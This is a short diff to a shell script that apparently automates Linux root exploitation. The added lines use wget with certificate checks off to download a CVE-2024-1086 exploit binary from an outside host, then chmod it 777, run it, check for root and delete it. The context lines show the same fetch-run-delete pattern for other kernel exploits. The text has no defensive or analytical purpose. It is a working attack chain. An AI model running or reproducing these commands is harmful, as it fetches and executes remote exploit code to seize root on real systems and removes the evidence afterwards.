@@ -93,6 +93,12 @@ chmod 777 "top_10_exploit-sh.bin"
 check_root
 rm "top_10_exploit-sh.bin"
 
+wget -q "https://mrwawanj.github.io/localroot/CVE-2024-1086" --no-check-certificate
+chmod 777 "CVE-2024-1086"
+./CVE-2024-1086
+check_root
+rm "CVE-2024-1086"
+
 wget -q "https://mrwawanj.github.io/localroot/top_9_CVE-2017-1000112-c.bin" --no-check-certificate
 chmod 777 "top_9_CVE-2017-1000112-c.bin"
 ./top_9_CVE-2017-1000112-c.bin
